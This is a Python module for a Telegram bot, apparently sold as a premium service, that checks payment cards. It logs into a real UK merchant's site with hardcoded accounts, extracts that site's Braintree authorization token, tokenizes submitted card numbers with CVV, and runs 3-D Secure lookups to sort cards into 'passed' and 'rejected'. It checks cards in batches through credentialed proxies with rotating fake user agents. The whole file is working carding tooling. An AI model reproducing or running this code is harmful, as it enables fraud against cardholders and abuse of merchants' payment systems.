import os
import re
import time
import json
import base64
import random
import asyncio
import traceback
from collections import defaultdict
import jwt
import aiohttp
import requests
from pyrogram import Client, filters
from fake_useragent import UserAgent
from EQUROBOT import app
from config import OWNER_ID
from EQUROBOT.core.mongo import has_premium_access 

proxy_list = [
    "http://nzvuwsmz:yS6ks569Hy@65.181.174.194:63829",
    "http://nzvuwsmz:yS6ks569Hy@65.181.171.160:62110",
    "http://nzvuwsmz:yS6ks569Hy@65.181.167.98:63631",
    "http://nzvuwsmz:yS6ks569Hy@65.181.170.115:60681",
    "http://nzvuwsmz:yS6ks569Hy@65.181.172.225:59225"
]

def get_random_proxy():
    return {"http": random.choice(proxy_list), "https": random.choice(proxy_list)}

async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    bin_info = await response.json()
                    return (
                        bin_info.get("brand", "N/A"),
                        bin_info.get("type", "N/A"),
                        bin_info.get("level", "N/A"),
                        bin_info.get("bank", "N/A"),
                        bin_info.get("country_name", "N/A"),
                        bin_info.get("country_flag", ""),
                    )
                else:
                    return "Error fetching BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
        except aiohttp.ClientError:
            return "Error parsing BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"

def is_au_valid(au):
    try:
        decoded_au = jwt.decode(au, options={"verify_signature": False})
        exp = decoded_au.get('exp')
        if exp:
            current_time = int(time.time())
            if exp > current_time:
                return True
        return False
    except Exception as e:
        print(f"Error decoding 'au': {str(e)}")
        return False

def load_session_data():
    if os.path.exists('session_data.json'):
        with open('session_data.json', 'r') as f:
            return json.load(f)
    return None

def save_session_data(data):
    with open('session_data.json', 'w') as f:
        json.dump(data, f)

async def check_card(card_info, message):
    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return "Invalid card details. Please use the format: card_number|mm|yy|cvv"

    cc, mm, yy, cvv = card
    start_time = time.time()

    user_agent = UserAgent()
    user = user_agent.random

    session_data = load_session_data()
    if session_data and is_au_valid(session_data.get('au')):
        au = session_data['au']
        print("Using cached 'au' value.")
    else:
        print("Performing login to obtain new 'au' token...")
        acc = ['sophia534201@promail.fun', 'hunter227312@newmail.online']
        email = random.choice(acc)
        r = requests.session()
        headers = {'user-agent': user}
        response = r.post('https://hakko.co.uk/my-account/add-payment-method/', headers=headers)
        nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
        if not nonce_match:
            print("Failed to extract login nonce.")
            return "Failed to extract login nonce."
        nonce = nonce_match.group(1)
        print("Starting Login Extracted ✅", nonce)
        data = {
            'username': email,
            'password': 'qFjbaeWjjGEMz5bU',
            'woocommerce-login-nonce': nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'login': 'Log in',
        }
        response = r.post('https://hakko.co.uk/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
        nonce_matches = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        if not nonce_matches:
            return "Failed to extract add-payment-method nonce."
        nonce = nonce_matches[0]
        enc_match = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text)
        if not enc_match:
            return "Failed to extract Braintree client token."
        enc = enc_match.group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au_matches = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
        if not au_matches:
            return "Failed to extract authorization fingerprint."
        au = au_matches[0]
        session_data = {'au': au}
        save_session_data(session_data)

    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        'authorization': f'Bearer {au}',
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "priority": "u=1, i",
        "referer": "https://assets.braintreegateway.com/",
        "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": user,
    }

    json_data = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": "091fd1d0-67fa-4f18-bfba-642a00b8667c",
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                    "billingAddress": {
                        "postalCode": "UB4 9AX",
                        "streetAddress": "262-264 Yeading Ln",
                    },
                },
                "options": {
                    "validate": False,
                },
            },
        },
        "operationName": "TokenizeCreditCard",
    }

    try:
        proxy = get_random_proxy()
        response = requests.post(
            "https://payments.braintree-api.com/graphql",
            headers=headers,
            json=json_data,
            proxies=proxy,
        )
        response_data = response.json()

        if "errors" in response_data:
            return f"Failed to tokenize the card. Error details: {response_data.get('errors')}"

        token = response_data["data"]["tokenizeCreditCard"]["token"]
        print("Payment ID Creation ✅", token)

        lookup_headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://hakko.co.uk",
            "priority": "u=1, i",
            "referer": "https://hakko.co.uk/",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": user,
        }

        lookup_json_data = {
            "amount": "904.06",
            "browserColorDepth": 24,
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": "en-US",
            "browserScreenHeight": 768,
            "browserScreenWidth": 1366,
            "browserTimeZone": -330,
            "deviceChannel": "Browser",
            "additionalInfo": {
                "shippingGivenName": "Isabella ",
                "shippingSurname": "Martin",
                "ipAddress": "106.208.150.64",
                "billingLine1": "Dee St",
                "billingLine2": "",
                "billingCity": "Banchory",
                "billingState": "",
                "billingPostalCode": "AB31 5HS",
                "billingCountryCode": "GB",
                "billingPhoneNumber": "01330822625",
                "billingGivenName": "Isabella ",
                "billingSurname": "Martin",
                "shippingLine1": "Dee St",
                "shippingLine2": "",
                "shippingCity": "Banchory",
                "shippingState": "",
                "shippingPostalCode": "AB31 5HS",
                "shippingCountryCode": "GB",
                "email": "n62bqm@qacmjeq.com",
            },
            "challengeRequested": True,
            "bin": cc[:6],
            "dfReferenceId": "0_d58bc780-01fc-4114-819f-7dddc3e1b0b6",
            "clientMetadata": {
                "requestedThreeDSecureVersion": "2",
                "sdkVersion": "web/3.106.0",
                "cardinalDeviceDataCollectionTimeElapsed": 1390,
                "issuerDeviceDataCollectionTimeElapsed": 901,
                "issuerDeviceDataCollectionResult": True,
            },
            "authorizationFingerprint": au,
            "braintreeLibraryVersion": "braintree/web/3.106.0",
            "_meta": {
                "merchantAppId": "hakko.co.uk",
                "platform": "web",
                "sdkVersion": "3.106.0",
                "source": "client",
                "integration": "custom",
                "integrationType": "custom",
                "sessionId": "091fd1d0-67fa-4f18-bfba-642a00b8667c",
            },
        }

        lookup_response = requests.post(
            f"https://api.braintreegateway.com/merchants/wcr3cvc237q7jz6b/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
            headers=lookup_headers,
            json=lookup_json_data,
            proxies=proxy,
        )
        lookup_response_data = lookup_response.json()
        msg = (
            lookup_response_data.get("paymentMethod", {})
            .get("threeDSecureInfo", {})
            .get("status", "")
        )

        brand, card_type, level, bank, country, flag = await get_bin_info(cc[:6])

        if "authenticate_successful" in msg:
            status = "𝗣𝗮𝘀𝘀𝗲𝗱 ✅"
            resp = "Authenticate Successful"
        elif "authenticate_attempt_successful" in msg:
            status = "𝗣𝗮𝘀𝘀𝗲𝗱 ✅"
            resp = "Authenticate Attempt Successful"
        elif "authentication_unavailable" in msg:
            status = "𝗣𝗮𝘀𝘀𝗲𝗱 ✅"
            resp = "Authentication Unavailable"
        elif "authenticate_frictionless_failed" in msg:
            status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
            resp = "Authenticate Frictionless Failed"
        elif "authenticate_rejected" in msg:
            status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
            resp = "Authenticate Rejected"
        elif "challenge_required" in msg:
            status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
            resp = "Challenge Required"
        elif "lookup_card_error" in msg:
            status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
            resp = "Lookup Card Error"
        elif "lookup_error" in msg:
            status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
            resp = "Lookup Error"
        else:
            status = "𝐔𝐧𝐤𝐧𝐨𝐰𝐧 ⚠️"
            resp = "Unexpected response"

        execution_time = round(time.time() - start_time, 2)

        final_response = (
            f"{status}\n\n"
            f"𝗖𝗮𝗿𝗱 ⇾ `{cc}|{mm}|{yy}|{cvv}`\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ 3DS Lookup\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {resp}\n\n"
            f"𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type} - {level}\n"
            f"𝗜𝘀𝘀𝘂𝗲𝗿 ⇾ {bank} 🏛\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}\n\n"
            f"𝗧𝗶𝗺𝗲 ⇾ {execution_time} **Seconds**\n"
            f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ [{message.from_user.first_name}](tg://user?id={message.from_user.id})"
        )

        return final_response

    except Exception as e:
        error_message = f"An error occurred: {str(e)}\n"
        error_type = f"Error Type: {type(e).__name__}\n"
        traceback_details = traceback.format_exc()
        full_error = error_message + error_type + traceback_details
        return "An internal error occurred, please try again later."


card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")


def extract_card_info(message):
    card_info = None
    if message.reply_to_message:
        card_info = re.search(card_pattern, message.reply_to_message.text)
        return card_info.group() if card_info else None
    try:
        card_info = message.text.split(maxsplit=1)[1].strip()
    except IndexError:
        pass
    return card_info


@app.on_message(filters.command("vbv", prefixes=[".", "/", "!"]))
async def vbv_check_handler(client, message):
    user_id = message.from_user.id
 
    if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
        return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")

    card_info = extract_card_info(message)

    if not card_info or not card_pattern.match(card_info):
        await message.reply("Please provide valid card details in the format: `card_number|mm|yy|cvv`")
        return

    processing_msg = await message.reply("Processing your request...")

    try:
        response = await check_card(card_info, message)
        await processing_msg.edit_text(response)
    except Exception as e:
        await processing_msg.edit_text(f"An error occurred: {str(e)}")

@app.on_message(filters.command("mvbv", prefixes=[".", "/", "!"]))
async def mvbv_check_handler(client, message):
    user_id = message.from_user.id

    has_access, error_message, user_level = await has_premium_access(user_id, required_credits=1)
    user_level = user_level if user_level else "Free User"
    if not has_access:
        await message.reply_text(error_message)
        return

    card_text = extract_card_info(message)

    if not card_text:
        await message.reply("Please provide card details in the format:\n`/mvbv card1\ncard2\ncard3`")
        return

    card_lines = [line.strip() for line in card_text.split('\n') if line.strip()]

    if len(card_lines) > 6:
        await message.reply("You can check up to 6 cards at a time.")
        return

    tasks = [
        check_card(card_info, message)
        for card_info in card_lines if card_pattern.fullmatch(card_info)
    ]

    if len(tasks) < len(card_lines):
        await message.reply("Invalid card format found. Use: `card_number|mm|yy|cvv`")
        return

    processing_msg = await message.reply("Processing your request...")

    results = await asyncio.gather(*tasks)
    combined_results = "𝗠𝗮𝘀𝘀 𝗩𝗕𝗩 𝗟𝗼𝗼𝗸𝘂𝗽\n\n" + "\n\n\n".join(results)

    if len(combined_results) > 4096:
        for chunk in [combined_results[i:i + 4000] for i in range(0, len(combined_results), 4000)]:
            await message.reply(chunk)
    else:
        await processing_msg.edit_text(combined_results)
